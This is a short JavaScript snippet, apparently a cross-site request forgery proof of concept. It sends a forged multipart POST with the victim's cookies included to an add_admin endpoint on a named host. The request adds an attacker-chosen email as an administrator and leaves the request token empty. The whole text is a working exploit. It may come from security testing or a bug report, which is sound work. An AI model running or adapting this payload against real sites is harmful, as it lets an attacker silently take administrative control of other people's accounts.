// Simple POST request to add admin
const boundary = '----geckoformboundary519b951c733e47fa9fab90d7d781ca1e';
const formData = `--${boundary}\r
Content-Disposition: form-data; name="email"\r
\r
ya1qh@dollicons.com\r
--${boundary}\r
Content-Disposition: form-data; name="first_name"\r
\r
BAdmin\r
--${boundary}\r
Content-Disposition: form-data; name="last_name"\r
\r
attackAd\r
--${boundary}\r
Content-Disposition: form-data; name="user_role_ids[]"\r
\r
13688\r
--${boundary}\r
Content-Disposition: form-data; name="request_token"\r
\r
\r
--${boundary}--\r
`;

fetch('https://test.meetsoci.com/api/account/23463/add_admin?', {
    method: 'POST',
    headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`
    },
    body: formData,
    credentials: 'include'
});
